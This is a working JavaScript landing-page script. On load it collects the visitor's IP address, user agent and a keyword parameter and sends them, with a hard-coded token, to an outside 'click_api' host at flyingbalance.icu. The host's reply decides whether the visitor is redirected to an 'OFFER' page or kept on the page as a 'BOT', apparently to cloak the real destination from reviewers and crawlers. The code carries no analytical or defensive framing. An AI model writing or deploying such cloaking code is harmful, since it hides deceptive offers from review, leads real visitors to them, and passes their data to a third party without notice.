document.addEventListener("DOMContentLoaded", function() {
    makeApiRequest();
});

async function getIp() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error('Error getting IP:', error);
        return 'unknown';
    }
}

function getUserAgent() {
    return navigator.userAgent;
}

function getQueryParams(params) {
    return Object.keys(params).map(key => `${key}=${encodeURIComponent(params[key])}`).join('&');
}

async function makeApiRequest() {
    const ip = await getIp();
    const userAgent = getUserAgent();
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const keywordValue = urlObj.searchParams.get("keyword");
    const token = "pxtshqzgkd5p7fvkrm4rqtcv2cz7czyq";
    const apiUrl = `https://flyingbalance.icu/click_api/v3?token=${token}&log=1&info=1&ip=${ip}&user_agent=${encodeURIComponent(userAgent)}&keyword=${keywordValue}`;

    fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
            if (data.info && data.info.url === 'OFFER') {
                const params = {
                    token: token,
                    log: 1,
                    info: 1,
                    ip: ip,
                    user_agent: userAgent,
                    keyword: keywordValue
                };
                const newUrl = `/main?${getQueryParams(params)}`;
                window.location.href = newUrl;
            } else if (data.info && data.info.url === 'BOT') {
                console.log("BOT");
            }
            hidePreloader();
        })
        .catch(error => {
            console.error('Error:', error);
            hidePreloader();
        });
}

function hidePreloader() {
    document.getElementById('preloader').style.display = 'none';
}
